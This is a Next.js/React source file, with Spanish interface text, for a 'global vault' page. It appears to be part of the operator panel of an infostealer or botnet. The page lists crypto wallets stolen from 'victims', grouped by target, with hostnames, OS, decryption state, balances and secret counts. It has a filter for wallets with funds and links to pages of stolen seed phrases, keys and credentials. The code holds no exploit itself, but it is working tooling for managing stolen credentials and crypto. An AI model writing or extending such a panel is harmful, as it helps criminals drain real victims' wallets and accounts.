'use client';
import { useState } from 'react';
import Link from 'next/link';
import { ChevronDown, ChevronRight, Search, Wallet } from 'lucide-react';
import { useApi } from '@/hooks/useApi';
import type { Credential, Wallet as WalletType } from '@/lib/types';
import { ago, balanceTone, mask } from '@/lib/format';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Input, Select } from '@/components/ui/input';
import { Card } from '@/components/ui/card';
import { Empty, ErrorState, SkeletonRows } from '@/components/ui/table';
import { StateChip, VaultDrawer } from '@/components/vault-drawer';
import { CredentialTable } from '@/components/credential-table';

type GlobalWallet = WalletType & { victim: { id: string; hostname: string; os: string }; chain: string; secrets: number; hasBalance: boolean; balanceValue: number };
type Group = { key: string; targetId: string; chain: string; victim: { id: string; hostname: string; os: string }; wallets: GlobalWallet[]; count: number };
type Response = { items: GlobalWallet[]; groups: Group[]; next: string | null };

const ROW = 76;

export default function VaultPage() {
  const [mode, setMode] = useState<'wallets' | 'credentials'>('wallets');
  const [q, setQ] = useState('');
  const [chain, setChain] = useState('');
  const [state, setState] = useState('');
  const [balance, setBalance] = useState('');
  const [open, setOpen] = useState<Record<string, boolean>>({});
  const [drawer, setDrawer] = useState<string | null>(null);
  const [scroll, setScroll] = useState(0);
  const [page, setPage] = useState<string | null>(null);
  const query = `q=${encodeURIComponent(q)}&chain=${chain}&state=${state}&balance=${balance}&limit=100${page ? `&cursor=${page}` : ''}`;
  const vault = useApi<Response>(mode === 'wallets' ? `/vault?${query}` : null);
  const groups = vault.data?.groups ?? [];
  const viewport = 620;
  const start = Math.max(0, Math.floor(scroll / ROW) - 3);
  const end = Math.min(groups.length, start + Math.ceil(viewport / ROW) + 6);
  const visible = groups.slice(start, end);

  return (
    <>
      <div className="flex flex-wrap items-center gap-2 pt-3">
        <div>
          <h1 className="text-lg font-semibold">Bóveda global</h1>
          <p className="text-2xs text-muted">Material de todas las víctimas, agrupado por target. <Link href="/seeds" className="text-brand">Ver semillas y claves →</Link></p>
        </div>
        <div className="flex gap-1 max-sm:w-full max-sm:justify-start sm:ml-auto">
          <button className="chip" data-active={mode === 'wallets'} onClick={() => setMode('wallets')}><Wallet className="h-3 w-3" /> wallets</button>
          <button className="chip" data-active={mode === 'credentials'} onClick={() => setMode('credentials')}><KeyIcon /> credenciales</button>
        </div>
      </div>

      {mode === 'wallets' ? (
        <>
          <div className="mt-3 grid grid-cols-2 gap-2 sm:flex sm:flex-wrap sm:items-center">
            <div className="relative col-span-2 min-w-0 sm:flex-1">
              <Search className="absolute left-2 top-2 h-3.5 w-3.5 text-muted" />
              <Input value={q} onChange={(event) => setQ(event.target.value)} placeholder="target, address o equipo" className="pl-7" aria-label="Buscar en la bóveda" />
            </div>
            <Select value={chain} onChange={(event) => setChain(event.target.value)} aria-label="Cadena" className="w-full sm:w-auto">
              <option value="">todas las cadenas</option><option value="evm">EVM</option><option value="btc">BTC</option><option value="sol">SOL</option><option value="other">otras</option>
            </Select>
            <Select value={state} onChange={(event) => setState(event.target.value)} aria-label="Estado" className="w-full sm:w-auto">
              <option value="">todos los estados</option><option value="found">found</option><option value="decrypted">decrypted</option><option value="locked">locked</option><option value="no_vault">no vault</option><option value="failed">failed</option>
            </Select>
            <button className="chip col-span-2 justify-center sm:col-span-1 sm:w-auto" data-active={balance === '1'} onClick={() => setBalance(balance === '1' ? '' : '1')}>solo con balance</button>
          </div>
          <Card className="mt-2">
            {vault.loading && !vault.data ? <SkeletonRows rows={10} cols={5} /> : vault.error ? <ErrorState message={vault.error.message} retry={vault.refresh} /> : groups.length === 0 ? (
              <Empty title="Sin material en la bóveda" hint="Escanear wallets desde una víctima llena esta vista. Las semillas y claves tienen su propia sección." action={<Link href="/victims?has=wallets"><Button size="sm">Ir a Equipos</Button></Link>} />
            ) : (
              <div className="scroll-panel h-[620px]" onScroll={(event) => setScroll(event.currentTarget.scrollTop)}>
                <div style={{ height: start * ROW }} />
                {visible.map((group) => {
                  const expanded = open[group.key];
                  return (
                    <div key={group.key} style={{ minHeight: ROW }} className="border-b border-line/60">
                      <button className="flex w-full items-center gap-2 px-3 py-3 text-left hover:bg-panel-2/60" aria-expanded={Boolean(expanded)} onClick={() => setOpen((current) => ({ ...current, [group.key]: !expanded }))}>
                        {expanded ? <ChevronDown className="h-3.5 w-3.5 text-muted" /> : <ChevronRight className="h-3.5 w-3.5 text-muted" />}
                        <span className="font-mono text-xs text-ink">{group.targetId}</span>
                        <Badge>{group.chain}</Badge>
                        <StateChip state={group.wallets[0]?.state ?? 'found'} />
                        {group.wallets[0]?.address ? <span className="font-mono text-2xs text-muted">{mask(group.wallets[0].address, 10)}</span> : null}
                        {group.wallets.some((wallet) => wallet.hasBalance) ? <span className="num text-2xs text-warn">{group.wallets.find((wallet) => wallet.hasBalance)?.balance}</span> : group.wallets[0]?.balance ? <span className={balanceTone(group.wallets[0].balanceValue)}>{group.wallets[0].balance}</span> : null}
                        <span className="ml-auto flex items-center gap-2 text-2xs text-muted">
                          <Link href={`/victims?select=${group.victim.id}&tab=boveda`} className="-mx-1 -my-1 inline-flex min-h-6 items-center px-1 py-1 text-brand" onClick={(event) => event.stopPropagation()}>{group.victim.hostname}</Link>
                          {group.count} perfiles · {ago(group.wallets[0]?.lastSeenAt)}
                        </span>
                      </button>
                      {expanded ? (
                        <div className="divide-y divide-line/60 border-t border-line/60">
                          {group.wallets.map((wallet) => (
                            <button key={wallet.id} className="flex w-full items-center gap-2 px-6 py-1.5 text-left hover:bg-panel-2/60" onClick={() => setDrawer(wallet.id)}>
                              <span className="max-w-[50%] truncate font-mono text-2xs text-muted" title={wallet.path}>{wallet.path}</span>
                              <StateChip state={wallet.state} />
                              <span className="ml-auto text-2xs text-muted">{wallet.secrets} secretos · {ago(wallet.lastSeenAt)}</span>
                            </button>
                          ))}
                        </div>
                      ) : null}
                    </div>
                  );
                })}
                <div style={{ height: Math.max(0, (groups.length - end) * ROW) }} />
              </div>
            )}
          </Card>
          {vault.data?.next ? <Button size="sm" variant="secondary" className="mt-2" onClick={() => { setPage(vault.data!.next); setScroll(0); }}>siguiente página</Button> : null}
        </>
      ) : <div className="mt-3"><CredentialTable global /></div>}
      <VaultDrawer walletId={drawer} onClose={() => setDrawer(null)} />
    </>
  );
}

function KeyIcon() {
  return <span aria-hidden>⚿</span>;
}
